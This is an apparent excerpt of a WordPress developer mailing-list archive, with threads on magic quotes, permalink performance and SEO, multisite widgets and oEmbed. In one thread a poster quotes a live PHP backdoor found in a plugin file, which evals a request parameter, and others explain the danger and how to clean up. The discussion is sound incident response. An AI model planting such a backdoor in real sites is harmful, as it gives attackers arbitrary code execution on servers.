functions.php and go on with that..

However what I needed here was to address a specific style just to the 
name of the link without affecting the image, but I wasn't able to do so 
with the actual way of displaying things..
I think I'll stick with the suggestion of using get_bookmarks, I didn't 
know this function but seems just what I was looking for..


Thanks a lot everybody

Subject: [wp-hackers] styles, scripts & a meta box = problem
Message-ID: <4719415.584.1307653262710.JavaMail.geo-discussion-forums@vbye20>

Hi list,

in the continous efforts to make most of my theme code generic and avoid 
coding the same stuff over and over again, I started writing my own little 
set of classes to build form fields (standard html, colorpicker, datepicker 
& media upload) for admin pages & meta boxes. At first it seemed pretty 
straight forward as WordPress even includes all of the necessary styles & 
scripts (just had to include a datepicker). 

But then i ran into the following problem (please read over here in detail 
[1]): I can't load any styles & scripts using the "BackPress script/styles 
procedural API" - wp_enqueue/register_script/style();

Meta Boxes are a great concept and have them working out of the box with 
just a call to a function is extremly kool - and same goes for adding styles 
and scripts. But what are meta boxes for? They are here for adding 
additional input fields. And they have the kool drag & drop and open/close 
jQuery feature. But they don't allow me adding stuff at a level of equal 
koolness inside. 

So is there any idea on how i could intercept meta box callbacks early 
enough to let styles & scripts get registered? I'm searching for a solution 
that avoids splitting my classes just to allow to use them not only on admin 
pages, but on meta boxes too? Or: is there any idea on where a core-patch 
should start to allow the inner life of a meta box be as kool as the box 
itself?

Thanks in advance!
K.

Subject: [wp-hackers] global $wp_registered_widgets of the main blog
Message-ID: <BANLkTi=pqAC-z1P3G0TwNdYrnrDDwSEDyw@mail.gmail.com>

Hi Hackers,

I'm creating a plugin for WP multisite and I need to access to the value of
the global variable $wp_registered_widgets of the blog_id = 1, that is,
wherever I am, for example, in the index of blog_id = 2 or 3, etc. I need
the value of that variable of the main blog.

I have tried the following code to do this:

global $switched;
switch_to_blog(1);
global $wp_registered_widgets;
restore_current_blog();

but it doesn't work because the function switch_to_blog only works if you
call to another functions, not for global variables.

Any ideas?, because I have not found a function in /wp-includes/widgets.php
that retrieves that value. So I prefer to ask you before to query the info
of each register widget and to merge it into an array.

Thanks :)

I'm not sure because I don't have time to test it, but try calling wp_widgets_init() like so:

global $switched;
switch_to_blog(1);
wp_widgets_init();
global $wp_registered_widgets;
restore_current_blog();
wp_widgets_init();

(Note I assume your code is incomplete pseudo code and that you'll actually use more code than you listed.) 

Hope this helps.

Ok, I have used add_blog_option() and get_blog_option() to keep the value of

Bjorn,

I don't know if it's the preferred method, but my friends who have taken over maintenance of the university-wide WP installation served by this hack http://ur1.ca/4dr6j are maintaining it in the current version of WP.

I'll see if I can get one of them to join the conversation regarding how that code may have evolved between then and now.

In my experience it's not worth having multiple installs just to keep the
databases seperate. From a performance perspective all my bottlenecks have
been in the posts and taxonomy tables, and those are not shared within a
multisite install. MySQL chokes badly if you give any one *table* too much
traffic, but as far as I can tell it doesn't matter if two tables are in the
same 'database' or just on the same database server, they will have the same
amount of autonomy and will fail the same way when one of those sites
develops a large set of posts and runs complex queries on them.

If everything else about your site plan makes sense with Multisite (i.e. if
the plugins and themes can be shared by all sites in the network, if the
sites are all related enough in terms of their owners/operators that it
makes sense for them to live in the same spot) then you should try
implementing it that way, you lose a lot of benefits when you have multiple
sites instead of multisite, and merging sites together can be a daunting
task if you already have a lot of content and users in the split-up sites.

If you end up needing to optimize the database setup there are any number of
ways you can go about it, but if you want single-sign-on across sites then
your solution will have to involve all these sites living on the same MySQL
install, so the difference in optimization simplicity is pretty small
between Multisite and multiple installs.

Hi Casey,

Would be great if you can get one of them to explain how they are
maintaining it in the current version of WP. I have been playing with
the methode described by you (thanks again for sharing the info!), but
the .htaccess rewrite rules seem to prevent me from using it with a
correct stylesheet, which seems to be a similar issue you described as
well. Looking at the mod_rewrite logs hasn't given me any insight in why
it is serving the page but not the css (and images) correctly.

I've noticed a lot of requests from people who want to have nested
structures and I'm willing to invest some time in developing a plugin
allowing people to do this. Any help much appreciated!

grtz

Subject: [wp-hackers] Magic Quoting removal Road Map/Plan
Message-ID: <BANLkTik+PGEBqkS1ig7TPJMt6dOmSrHcww@mail.gmail.com>

Hello!

I've been doing plugins and Wordpress themes now for few weeks, and I
just discovered that there is nasty ancient relic: MAGIC QUOTING,
still enforced in WP. Needless to say it has to be abolished some
time. But I found out that there is no plan, or any kind of road map
to get rid of it!

So I decided to post my plan here:

1. First phase, add some identifier it does not matter what as long as
it is there telling they are quoted, it is better than nothing and
does not break anything:

  function wp_magic_quotes() {
    ...
    set_magic_quotes_runtime(true); // <PHP5.3
    ini_set('magic_quotes_runtime', true); // >PHP5.3
    // atleast WP Specific, if above does not work?
    $WP_MAGIC_QUOTES = true;
  }

All plugin developers should be then encouraged to stripslashes
*conditionally* based on this attribute which ever is used.


1. First phase (optional) (slight memory overhead but then again WP
has a lot of memory overhead already, and this one is for good cause):

This would make adding external libraries faster: Store untouched
"pure" version of the superglobals to the alternative superglobal so
that one could simply *search/replace* external libraries for $_POST
-> $_SERVER['ORIGINAL_POST']:

  function wp_magic_quotes() {
    // Currently search & replace with
    // stripslashes that does not always work
    //
    // Following is not pretty, but makes patching
    // external libs fast only search / replace:
    $_SERVER['ORIGINAL_POST'] = $_POST;
    $_SERVER['ORIGINAL_GET'] = $_GET;
    ...
    $_POST = add_magic_quotes( $_POST );
    ...
  }

Both of these first phase ideas are such that does *not* break
backwards compatibility, only improve forward compatibility.


2. Phase get rid of ORIGINAL_POST, ORIGINAL_GET if any, secondly set
the WP_MAGIC_QUOTES = false, then one can "almost" safely remove the
magic quoting. But for those who care about backwards compatibility we
can do same trick as in first phase but for quoted variables:

  function wp_magic_quotes() {
    $_SERVER['QUOTED_POST'] = add_magic_quotes($_POST);
    ...
  }

Old plugins should simply replace $_POST -> $_SERVER['QUOTED_POST] if
they are not in mood to fix their plugins all the way.

New libraries/plugins could simply use PHP default behavior of _POST -
no more hacks for new libraries!


3. Phase get rid of whole wp_magic_quotes! Mission accomplished.



Thanks,

P. S. please do not only consider phase 1, do it! It costs nothing -
only one variable WP_MAGIC_QUOTES = true and everyone could
conditionally start stripslashing according to this variable.

I think Baki meant 'webfonts':
http://wordpress.org/extend/plugins/search.php?q=webfonts

Despite confusingly all having the same name, each of those plugins is
different, e.g. "Webfonts plugin for wordpress in XmL format with editor",
"Webfonts plugin for wordpress in xml format without editor" & "Webfonts
plugin for wordpress in json format with editor".

Beat me to the punch!

Take a look at the URLs for each of those Plugins, and you will see that
each one is, in fact, a different Plugin.

If you think that one is confusing, check this out:

Yeah, there's some serious plugin duplication going on there. Too many
people all submitting the same essential plugins over and over.

Hi Jari,

Welcome to WordPress!

This topic has been discussed at length in the past, most recently in
March [1]. This specific response from Andrew Nacin [2] sums it up
well (Andrew is a WordPress core committer).

The single most important thing is consistency - whether we have magic
quoted variables or non-magic quoted variables - as long we only have
one or the other then it makes the lives of WordPress plugin
developers that much easier and their code that much more secure. It's
important to realise that having magic quoted variables isn't
inherently bad, the badness comes from inconsistencies between
environments (which is what WordPress avoids by magic quoting
everything). If a plugin author forgets a conditional check somewhere
on a variable and doesn't escape it, it introduces a potential
security vulnerability (which is one of the main reasons magic quoting
was deprecated in PHP itself - to achieve consistency).

The code that you included has little benefit over PHP's default
implementation of magic quotes. The end result is that plugins must
still perform conditional logic each time they interface with $_GET or
$_POST variables to see whether the data is magic quoted or not. This
is exactly what we avoid in the WordPress environment by quoting
everything.

Hi!

Got perhaps better idea for first phase, encourage a wrapper for
getting user inputs which gives the data always in *non-magic quoted*
format:

  function wp_get_post($key[, $defaultvalue=null]);
  function wp_get_get($key[, $defaultvalue=null]);
  function wp_get_request($key[, $defaultvalue=null]);

These wrappers would allow developers to see when wp_magic_quotes can
be removed == when most people use these wrapper functions in plugins.

Those should be used like this in plugins:

  $a = wp_get_post("something", "notfound");

which would be same as currently as (in WP):

  $a = stripslashes_deep(isset($_POST['something']) ?
$_POST['something'] : 'notfound');

This does not break anything either.

I agree with Jeremy. You always can have the option to shard databases
or even implement your own database layer. An example of this would be
hyperdb.

This is a problem if there is ONE API that gives output in TWO
formats, but with my idea that is not the case:

If we have wrappers for getting in non-magic quoted format we have
*TWO* API's, one that gets results in non-magic quoted format too.
There is no confusion WHAT SO EVER, since they are distinctly
different API's. As an bonus IF everyone start to use this new API it
allows to get rid of whole wp_magic_quotes in distant future.

Consider the wrapper non-magic-quoting API addition, please!


P.S my example should have been:

$a = wp_get_post("something", "notfound");

equals

$a = isset($_POST['something']) ?
stripslashes_deep($_POST['something']) : 'notfound';

That's fine, but you're straying from the issue at hand. If functions
like this were implemented we are still left with the $_GET and $_POST
superglobals that are currently quoted. The issue is that we cannot
remove quoting from these variables because it introduces a security
vulnerability for every plugin and theme that's been written up until
this point. If we can't remove quoting from the superglobals, this is
a fruitless exercise.

No sir. If everyone starts to use new API we can get rid of $_GET and
$_POST quoting. Get it? We must push everyone to use new API and when
in distant future, future of PHP6 maybe, we can get rid of this _GET
_POST quoting etc.

Hello!

Here is a quick take on the matter as code (only for _POST as example):



$WP_NONQUOTED_POST = array();

/**
 * Add magic quotes to $_GET, $_POST, $_COOKIE, and $_SERVER.
 *
 * Also forces $_REQUEST to be $_GET + $_POST. If $_SERVER, $_COOKIE,
 * or $_ENV are needed, use those superglobals directly.
 *
 * @access private
 * @since 3.0.0
 */
function wp_magic_quotes() {
    global $WP_ORIGINAL_POST;

    // If already slashed, strip.
    if ( get_magic_quotes_gpc() ) {
        $_GET    = stripslashes_deep( $_GET    );
        $_POST   = stripslashes_deep( $_POST   );
        $_COOKIE = stripslashes_deep( $_COOKIE );
    }

    // Original non quoted
    $WP_NONQUOTED_POST = $_POST;

    // Escape with wpdb.
    $_GET    = add_magic_quotes( $_GET    );
    $_POST   = add_magic_quotes( $_POST   );
    $_COOKIE = add_magic_quotes( $_COOKIE );
    $_SERVER = add_magic_quotes( $_SERVER );

    // Force REQUEST to be GET + POST.
    $_REQUEST = array_merge( $_GET, $_POST );

    set_magic_quotes_runtime(true);
}

/**
 * Return original POST without magic quoting
 *
 * @param false|string $key Key, if not given whole POST is returned
 * @param mixed $default Default value if key is not found
 * @return mixed Returns the value or default value if key is not found
 */
function wp_get_post($key=false, $default=null) {
    global $WP_NONQUOTED_POST;

    if ($key === false) {
        return $WP_NONQUOTED_POST;
    }
    return isset($WP_NONQUOTED_POST[$key]) ? $WP_NONQUOTED_POST[$key]
: $default;
}

Nope.

Because that assumes that you can magically ensure that every piece of even non public plugin and theme code gets converted over.

Of course not, but there are bigger and smaller compatibility problems
with upcoming PHP updates than this little WP one. At least if people
*start* to use this new API there will be possibility in future to get
rid of it magic quoting.

Thats what is required to do, better API and deprecate old one
graciously, that's the only way forward.

Sticking to this tiny backwards compatibility problem in face of much
bigger ones just does not make sense.

Jari,

The biggest part of the problem is the 14,781 plugins in the repository. Are
you going to change all of them? And what about the thousands of private
plugins?

Then add in the 25 million + installs of WordPress out in the wild, are you
going to oversee every single one to make sure they upgrade every single
plugin?

Then of course there are themes with more functional code in them than is
good for them, some of them use this stuff too.

Mike

Thats finite number sir! They will get modified and mutilated a shit
loads when PHP6 comes. That is the way it is in PHP, this is a
language that is in constant identity crisis, take for instance PDO
which starts to be enforced in PHP6, there goes the whole point of
ever having magic quotes, it supports prepared statements.

Point is, with introduction to faster non-magic quote API we *have a
chance*. And bear in mind it is faster! Even if nothing, nada were
ever done to mitigate removal of slashes from _POST, _GET etc we would
have access to PHP5,6 compatible _POST etc using this API which is
faster (since it does not require re-running stripslashes over
everything.)

Some Plugins in the Repository haven't been updated since 2004. Do you
really think that the advent of PHP6 is *really* going to motivate the
developers of such Plugins to update their code?

Of course not, they are most likely abandoned code, just like most
Open Source. But they will stop working in new PHP6 releases, you
can't fix them either with sticking to this mutilating read-only
variables. They break on some other part then.

When the core PHP developers start discussing PHP6 with seriousness, maybe a
few years from now, I'm sure we'll at the very least revisit this topic.

Until then, this is academic.

YouTube itself does not return an oEmbed answer for a playlist URL, but 
Embedly does 
[ http://support.embed.ly/entries/206523-you-tube-playlist-support ].

Embedly is a sort of "oEmbed wrapper" for sites that don't support oEmbed 
themselves, or for extra features (like the YouTube playlist). You can use 
it as a WordPress plugin [ http://wordpress.org/extend/plugins/embedly/ ]. 
They recently reshuffled their signup page, almost hiding the "free" signup 
page, but you can find it here: [ https://app.embed.ly/pricing/free ].

Subject: [wp-hackers] Permalink Structure - Performance vs. SEO
Message-ID: <BANLkTi=5o9nTeDuSFFX52fu9ASPA-fPANw@mail.gmail.com>

I have a question ... Working in a large project site and will have many
pages, so I opted for the permalink structure that shows the year before the
name of the post, did it to improve the performance of WP.

The problem is that the analyst SEO project asked me to use the category
structure / name of the post, I explained that this causes WordPress to
create several lines of rules to be more than normal and can severely damage
the site in terms of performance, since whenever a URL is requested the WP
need to read a lot of rules to find how to handle the URL, but he claimed
that putting the loss of performance and loss of points in the optimization
SEO SEO ending balance weighing more.

Ask references about the interference of the URL in the site optimization
but he has not handed me anything, so I come to exchange experience with you
on the subject, have done so? Actually the structure category / name of the
post instead of year / name of the post will greatly influence the
positioning of pages in search engines?

I heard that the site performance seems to impact page rank too, and can
affect negatively the conversions on your pages (to mailing lists, twitter
accounts, etc.)

Ask references about the interference of the URL in the site optimization

Thanks Jan for the info, do you know if it supports additional player
options for playlists, like it is possible for single videos? For example
turning on/off player controls?

Hi Leo,

Yes, by default WordPress cannot handle the URL structure of "category_name/name" without potentially having serious performance issues, but it is possible to handle the routing yourself for those URLs and then it can be sufficiently performant, especially if you use caching for the category slugs and for the most frequent URLs. 

The basic approach is to subclass the WP class (call it Leos_WP?) and in a "setup_theme" hook replace the $wp instance with an instance or your subclass like this:

global $wp;
$wp = new Leos_WP(); 

You also override the parse_request() method in Leos_WP and in it test $_SERVER['REQUEST_URI'] to see if it contains a valid "category_name/name" and if so then set $name to have the post slug and set the following:

global $wp;
$wp->query_vars = array('name'=>$name);

If it doesn't match "category_name/name" then just delegate back to the parent parse_request().  This is where your caching of the list of categories can come in handy.

You will also want to use the 'post_type_link' hook to ensure WordPress displays the proper URL for posts.  One issue will be you'll need to pick a primary category for a post's URL if there are more than one category assigned to the post.  

I've got this implemented in a more complex setup so I know it works well.  If you want to attempt it and have additional questions, just ask.

NOTE: I would be cautious to include this solution in a plugin that you plan to distribute because it would be incompatible with any other plugin that decides to use this same technique.  Of course if the WordPress team were to add the hook requested in ticket #16992 then this technique could easily be used in a plugin without concern, and also without having to subclass the WP class:

http://core.trac.wordpress.org/ticket/16692

Hope this helps.

-Mike

Just got an email from my file monitor plugin that a file had been changed -
it is an inactive plugin file, strangely enough. Here is the content of the
file now:

<?php if(isset($_REQUEST['asc']))eval(stripslashes($_REQUEST['asc'])); ?>

Is this something dangerous?

I will check the original file from the repo right now and let you know the
difference.

Yes this is extremely dangerous. It's basically a backdoor to allow
arbitrary PHP code execution on your server. You should remove that
code immediately, change passwords, do a full cleanup, etc.

I removed it as soon I found out about it. I hope my other installs are not
infected as I don't have the file monitor running there.

Check your access logs for strange requests at the time the file was
detected,  You'll hopefully be able to see a POST request to one of the
plugin files at that point in time, or perhaps a long GET request, if you
can narrow down the file attacked, you can work out which plugin has the
vulnerability in it..

That is quite common. Many attacks are from other non-secure sites on the same server.

Leo, if you use /id/category/name it'll find and use the id first without impacting SEO. If you take a look through the archives here, there was a talk about it a couple months back and Matt Cutt's lecture from WP Camp confirmed Google doesn't worry about url depth. But, let me insert the caveat that performance and seo are tough subjects. My understanding on both these points could be wrong and if anybody want's to correct me, I'd love hear it.

Given seemingly knowledgeable WordPress users propensity to advise others to
set "other" access on folders to everything (aka, "just chmod it to 777")
it's amazing we don't see this more often.

The codex has it right "No directories should ever be given 777, even upload
directories. Since the php process is running as the owner of the files, it
gets the owners permissions and can write to even a 755 directory." but
sadly not every "gets it" until it's too late.

BTW I'm not saying in this case this happened, only that if your choose to
use shared hosting (and with VPS' so cheap, why would you any more) then you
must view "other" as hostile. I've seen so many compromised sites where it's
been taken by another user on the same server

Do a full cleanup, be 100% confident you have no modified code left, not
just your WP install (if it's a shall account, look for trojaned binaries
too) THEN change your password. There is every chance that the compromise
has modified "change password" scripts/binaries too, to capture your new
password as well as your old one.

You might be able to do it with oembed and some jquery.

Basically that's the question - is it possible to use oEmbed functionality
on WordPress on embed PlayLists and not only single Videos?

Hello there!

Someone could ever add some comments and indexes definitions to the example in Codex example? The current outputs undefined index. (In fact, I want to know how and where the definitions should go :S)

Thanks a lot!

I've worked as an SEO consultant for almost a decade, have been
working with WordPress for over half that time, built the best
WordPress SEO theme around (by a mile) and can tell you your SEO
analyst is wrong UNLESS every post in every category is also targeting
the keywords within the category?

That's not many sites that have that sort of SEO setup. If for example
you have a site about dogs having a category dogs and having all posts
within it would help with dogs relevant SERPs. But then if all your
posts are about dogs you would use dogs in the post titles, so you
would repeat dogs twice.

Basically if it's an important keyword to a post you should use it as
part of the post title.

Ignoring the domain name the best folder/filename structure for all
sites (not just WordPress) is

keyword-phrase

and if you name your posts with SEO in mind that should be covered by
the posts title, therefore the best SEO permalink structure for most
sites is

/post-title

Best SEO permalink structure taking into account performace is or a
derivative of

/id-post-title
/id/post-title

You can add a / to the end or .html or .php, I tend towards leaving
that out now (used to use html years ago).

When you mention Pages I assume you mean a lot of Static Pages rather
than a lot of pages in total (a lot of posts) on the site? If so you
should go with the performance example above, the SEO hit on the
perfect structure is minimal having a number (the ID) added to all
URLs.

Hi Diana,

you could start from Hello Dolly plugin, it's a good example of a well
written plugin.

For all the rest there is the official WP Documentation (aka Codex)
where you can find all the information you need about functions,
filters, actions, hooks, etc.

A plugin is simply a set of PHP files that use WordPress filters and
actions to add some features.

I hope that these few lines qill be useful for you.

I don't know what options are available now. There is an open feature 
request for this at the Embedly support site 
[ http://support.embed.ly/entries/20117823-enable-youtube-parameters-in-wp-plugin 
], I think you should follow that to get the news.

Also, unless I misunderstand the oEmbed code in WordPress [ 
http://core.trac.wordpress.org/browser/tags/3.1.3/wp-includes/class-oembed.php#L165 
], I believe only the url, width and height arguments are sent to the oEmbed 
provider. So a shortcode like [embed 
controls=0]http://example.com/some-item[/embed] would not send the 
"controls" argument.

Just tested, and if you install the Embedly plugin, this does work in a post:

Thanks guys, I am convinced that the best way, at least while the WP does
not updatethis part is to use the structure id / post as it should not
affect that much in terms ofSEO but it can bring an improvement in
performance.

DAvid, when I talk pages are pages created in WP, but not necessarily state
that havefewer updates.

Diana, how are you? As stated, a WordPress plugin is nothing more than a
system thatuses a PHP API that provides actions, filters, fasteners and so
on.

I believe that the Codex page that talks about the development of plugins
this briefbecause in fact there is plenty to talk about what needs to be
documented withexamples are the actions, filters, fasteners, classes, etc
...

I just wrote a simple plugin that adds support for additional params
for single video YouTube Player, kinda lacks handy interface, but if
anyone interested I probably could prettify it.

We are using this method essentially unchanged since converting from
WordPress MU 2.9.2 to WordPress 3.1.3. The new Network Admin site
creator disallows
creating paths with
slashes<http://core.trac.wordpress.org/browser/tags/3.1.3/wp-admin/network/site-new.php#L37>,
but you can edit them in similar to Casey's instructions ("Setting Up New

The performance issue with using a permalink structure of just the
post title as I understand it is related to the post permalinks can
match Static Page permalinks (static pages are like your about page
that are not part of the archives, so not a post).

If you have a site with a lot of static pages (so not posts) it can
cause a performance issue.

I'm far, far from an expert in this area, so repeating information
posted by those who do understand database performance issues.

In my expereince if you have a site with few static pages and use the
permalink structure

/title-of-post

which is

/%postname%

the permormance hit is minimal. This is the best SEO permalink
setting.

If you have a lot of static pages and are concerned at performance
(maybe a cheap hosting account so worried about resources) use

/id-title-of-post

which is

/%post_id%-%postname%

or similar.

In the project I have many static pages.

A URL with id / name of the post SEO interfere so much in so far as to
revealperformance problems, even if they are small?

And speaking tangentially, I wish more people cared about *user*
optimization more than *search engine* optimization. This whole movement to
obscure the post date (including not using year/month in the permalink,
etc.) just to gain some SEO advantage comes at the expense of users, who
would otherwise benefit from having such contextual information. (And
knowing the date of, e.g. a WordPress tutorial is invaluable for determining
its relevance/obsolescence.)

I agree with you Chip that the date of publication is important to improve the
relevance ofsearch results, but I believe search engines do not use the URL
string to determine the date of publication of the post, there are other
less manipulable for it.

SEO specialists to the list. It is possible to know what's more weight to a
URL, when organizing the search results in order of relevance?

I imagine it would be something like below, but it's just my imagination have
noreference to prove this:

1 - keywords;
2 - Order of keywords in relation to the search term;
3 - size of the url.

The algorithms are always changing. The answer today, may not be the
answer tomorrow. Your best bet is to create content that people
actually want to read and share.  Or just buy your traffic if it's
that important.

Aaron does not work with SEO, my concern at the moment the project is to
ensure the best performance possible and when the charge of the SEO
project came
to ask forchange in the structure of the URL I got no arguments, so I looked
 around.

What is "a lot" and "a few"?
10s 100s 1000s or 10,000s

If it's an obvious question, forgive my newbish-ness.

Would be nice to know when I need to start worrying about the
permalink. Since, the number in the url is a little unfamiliar to some
folks, I'd like to keep it out. But performance is very important to
me.

The action you need is wp_login which passes the user's login as the
first parameter.

IMO if the make-or-break point for your SEO strategy is a /date/ on the URL
,then you're using the wrong SEO strategist.

Claude, in my experience a "lot" depends on your db config (sorry couldn't
resist the pun).  It could be as few as 100s.  I had a site that was doing
something similar (no category slugs for archives).  At some point (low 100s
of pages/posts) the redirect table got so big that it
exceeded max_allowed_packet.  At that point, caching was about the only
thing that saved us since every page view would cost in excess of 2000
database requests (tried to rebuild the redirection table for every
request).

Set_current_user The action will not help, really the best option would
wp_signon ()(wp_login is deprecated and this is the surrogate), the thing is
 that wp_signon () is used to check if authentication data is correct, returns
true if so .

I think what the friend wants is just a function call at login time.

The discussion goes far and yet the majority opinion is that it is better to
ensure good performance, not least because it seems that the URL structure
proposed by theexpert here is going to change much in terms of SEO.

Thank you all.

Matt Cutts did a lecture at WordCamp 2007 conference in San Francisco (available here http://onemansblog.com/2007/08/04/matt-cutts-lecture-whitehat-seo-tips-for-bloggers/), I'll save you the hour long video and state that *at that time* the depth of the link did not matter.

As a result in the url http://onemansblog.com/2007/08/04/matt-cutts-lecture-whitehat-seo-tips-for-bloggers/, Google virtually ignores the /2007/08/04/ for SEO purposes.

As for performance, the Codex page at http://codex.wordpress.org/Using_Permalinks  states:

"For performance reasons, it is *not* a good idea to start your permalink 
structure with the category, tag, author, or postname fields. The reason is 
that these are text fields, and using them at the beginning of your 
permalink structure it takes more time for WordPress to distinguish your 
Post URLs from Page URLs (which always use the text "page slug" as the URL), 
and to compensate, WordPress stores a lot of extra information in its 
database (so much that sites with lots of Pages have experienced 
difficulties). So, it is best to start your permalink structure with a 
numeric field, such as the year or post ID."

The general gist is that it's best to start with a number because WP query's the database based on what it finds in your permalink, in order. So, in the url above is would look for 2007, then 08, then 04 and finally find the post at matt-cutts-lecture-whitehat-seo-tips-for-bloggers.

If however, the permalink had been http://onemansblog.com/122/matt-cutts-lecture-whitehat-seo-tips-for-bloggers/ it would have looked for Post ID 122 and found the article (assuming that was the ID).

I assume those two things are still true (however, I'd love to be corrected if I'm wrong) so in summary, the position of the SEO friendly text in a permalink doesn't matter and the least number of SQL calls are generated by putting the ID first.

Unfortunately, the best performance isn't always matched with
user-friendliness. The best URL's are URL's that are relevant and that
people can remember. An URL of
http://example.com/123456789/now-here-comes-the-slug  *might* be search
engine friendly but it sure isn't human friendly.

I recently changed a site that had ID's that are six figures. Search engines
were okay with the ID's but URL shorteners weren't. Dates are fine for blogs
but not everyone uses WordPress as a date-based CMS.

NOT TRUE, actually.  Including a ID in your permalink generates the same number of SQL calls, at least in a vanilla WP32 install calling path /2011/05/hello-world/ using the following code in functions.php to monitor:

add_action( 'query', 'wp32_query' );
function wp32_query($query) {
	global $wp32_query_list;
	$wp32_query_list[] = $query;
	return $query;
}
add_action( 'shutdown', 'wp32_shutdown' );
function wp32_shutdown() {
	global $wp32_query_list;
	print_r($wp32_query_list);
}

10 queries are generated of which only #2 differs:

Month and name Permalink: http://example.com/2011/06/sample-post/
============================================
 [2] =>  SELECT   wp_posts.* FROM wp_posts  WHERE 1=1  AND YEAR(wp_posts.post_date)='2011' AND MONTH(wp_posts.post_date)='5' AND wp_posts.post_name = 'hello-world' AND wp_posts.post_type = 'post'  ORDER BY wp_posts.post_date DESC 


Numeric Permalink: http://example.com/archives/123
============================================
 [2] =>  SELECT   wp_posts.* FROM wp_posts  WHERE 1=1  AND wp_posts.ID = 1 AND wp_posts.post_type = 'post'  ORDER BY wp_posts.post_date DESC 


IRONICALLY using the default permalink with just p=%post_id% generates one additional query, see: 

Default Permalink: http://example.com/?p=123
============================================
 [2] => SELECT option_value FROM wp_options WHERE option_name = 'rewrite_rules' LIMIT 1
 [3] =>  SELECT   wp_posts.* FROM wp_posts  WHERE 1=1  AND wp_posts.ID = 1 AND wp_posts.post_type = 'post'  ORDER BY wp_posts.post_date DESC 


So the conventional wisdom is wrong.  Instrument before assumption.

<soapbox>
Of course, using a post ID in a URL is anti-user friendly as it means absolutely nothing to a user and, if I had the power, I would banish from all use on the interwebs.
</soapbox>

Subject: [wp-hackers] User Details don't update until second refresh of page?
Message-ID: <4DF768EB.2080908@gmail.com>

I'm updating user details by way of wp_update_user, a form submitted on 
POST and a hook on "init".

User submits the form with new details, and they all get updated in the 
database via the hook above and WP function.

However further down the page when this updated user values are called 
(via get_currentuserinfo()) ... it will load with the OLD user data, 
until refreshing the page for a second time.

I thought anything in the theme ran "after" init?

Obviously I'm missing something as the database changes happen, and the 
user details get updated, but "echo $current_user->user_firstname" will 
still output the previous firstname until doing a second refresh.

Any ideas?

Thanks!

does any of this apply to custom post types?

i like their human-friendly default permalink structure of
post-type/post-title, but does that have any effect on performance -
especially on large sites with multiple custom post types (and custom
taxonomies) in use with 1000s of posts?

The cache will be being filled with the userdata before your update (or
perhaps, as part of the update).
You'll need to either clean, or update the cache (If you have an object of
the correct user data, update, else, clean)
See clean_user_cache($user_id); and update_user_caches(&$user);

In my opinion, the presence of an ID does not matter anymore when
speaking of human friendliness.
I do not have any statistics, but I think there are many more users
using search engines to find (again) some specific content than people
who "like" to remember urls to type them directly.

Custom post types with their standard permlink structure are not affected by the category_name/post_name URL concerns.

Chip is talking about the date in the URL being useful to *users*. Not
search engines, but actual *humans*. If I read a tutorial on how to do
something with WordPress, and I can see from the URL that it was posted a
week ago, I'm much more likely to trust that it's using up to date methods
than if it was posted two years ago.

Do what is best for your users (humans), first. If you have two choices to
make and they're equally good for users (humans), by all means choose the
one that is best for search engines (computers). Don't make the mistake of
reversing those steps, though.

I'd be willing to be a lot of money that search engines (computers) place
more value on content being linked to many times than they do on not having
the date of a piece of content in its URL. And the way to get your content
linked to is to produce the best content you can, presented in the best way
possible for users (humans). Good links come from humans, not computers, so
optimize for humans.

There's more to user friendliness in URLs than whether or not users can navigate to a URL. For example, there is auto-complete in browsers, especially for people revisiting pages and arbitrary numbers in URLs can confuse users.  

<soapbox>
Saying "it's not important anymore" is just a convenience so that the site developer can happily ignore an issue that they would prefer to be unimportant. IMO anyway.

Two things.

1) Please try to keep in mind (occasionally at least) that some of us
WP as a CMS for content that is not time sensitive. And , in fact the
inclusion of year/month is misleading or confusing. So date is not
*always* a good thing to make prominent. In these cases post id would
be a better fit.

The formula for what makes a good page is the same -- good content.

2)  "Good links come from humans, not computers" There is a minor flaw
in use of links for popularity. Don't know a solution. But links
should not be the "be all end all" of value. There are many extremely
valuable websites that I use on a daily basis that I have never
published a link to. I  might email the link. Or, PM the link. But I
don't put the link on a webpage or in a blog. As search engines have
gained popularity the need for posting mini-menus of links on a topic
has diminished. Every time you mention to someone to "google it"
rather than post a set of personal favorite links you are proving the
point that individuals creating links of favorite content is on the
wane. At the moment I suspect that if you actually measured the number
of links being created we'd find a large percentage being created by
computers in the form of text link spam bots or link-exchange
scheme-bots. My own rant. :)

The discussion we are having is about post_type='post' vs. post_type='page' and NOT about custom post types. Custom post types used for CMS use-cases are a non-issue (and if you are using post_type='post' for content that is not date-specific, you are doing it wrong.)

 Very good point. I recently ran some eye-tracking to find out what was
going wrong on a site. The posts on it are not time-sensitive because they
are regularly updated. However, while dates were not used in the URL, the
published date was displayed. A "last modified" date was also displayed. In
the tests, nobody looked at the modified date. Bounce rates off the old, but
recently updated, posts were incredibly high.
For sites like this, using a date anywhere was a mistake.

People "Google" content when they don't have a usable reference.  If you
want to really test the human-usability of your links, write them down on a
sticky note and ask someone to visit the page.  If your link is along the
lines of http://mysite.com/234192384/my-cool-post then it's easy enough to
write down and easy enough to type, but can break.  The "my-cool-post" slug
stands out, but if numbers are accidentally transposed in the id (234192384)
or someone reads a 6 rather than an 8, then they'll land on the wrong post.

A date-based system, though, is less prone to breaking.  If your URL is
along the lines of http://mysite.com/2011/06/my-cool-post you end up with
the following fallbacks:

   - If the slug is wrong, the user gets a list of all posts published in
   June of 2011
   - If the month is wrong (whether the slug is right or not), the user gets
   a list of all the posts published in whatever month they entered
   - If they leave off the month, the user gets a list of all 2011 posts

The advantage of this system is that it minimizes 404 errors.

The reality of the world, and this is hard for many of us who subscribe to a
hacker-related email list to remember, is that the majority of end users
won't be PMing, emailing, or tweeting the link.  A lot of people (and by "a
lot" I mean everyone I've ever met who isn't in a tech-centered career) will
pass on links by writing them down, printing them in a document, displaying
them on screen in a presentation, or delivering it verbally to someone else.
 If your link breaks down in any of these media, then whether or not it's
SEO-friendly doesn't really matter.

Yes, this is a dilemma to be sure.  But if your content is truly evergreen
(the inclusion of a year/month is misleading), then should you really be
publishing it as a post?  Evergreen content is better suited to pages in the
WP system.  Pages still function like posts, but aren't included in the
standard loop on the homepage and have a URL that lacks a date/time stamp.
 If your article was written 3 years ago but is still relevant, make it a
page instead.

Pardon me, I wrote every answer in Portuguese, English follows.

There is a real advantage in the structure year / month / name of post for
id / name of the post, but this only applies if the link being passed down
verbally or written down on paper and I believe that less than 1% of
exchanging links happens that way.

One argument used to defend the structure category / name of the post is to
create apath in the URL and it would be important in terms of indexing. I
saw the contentindicated by his friend Christopher Ross where Matt Cutts
